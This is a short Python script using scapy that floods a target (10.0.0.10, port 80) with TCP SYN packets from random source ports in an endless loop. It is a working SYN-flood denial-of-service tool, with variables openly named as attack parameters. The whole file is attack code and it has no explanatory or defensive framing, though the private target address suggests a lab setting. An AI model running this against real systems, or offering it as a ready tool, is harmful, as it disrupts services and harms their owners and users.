#!/usr/bin/python

from scapy.all import *
from scapy.layers.inet import IP

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


dicti = {'attck_ip_addr': '10.0.0.10', 'attack_port': 80}
b = time.time()
while True:

    segment = (IP(dst=dicti['attck_ip_addr']) / TCP(flags="S", sport=RandShort(), dport=int(dicti['attack_port'])))
    sendp(Ether() / segment)
print str(time.time() - b)
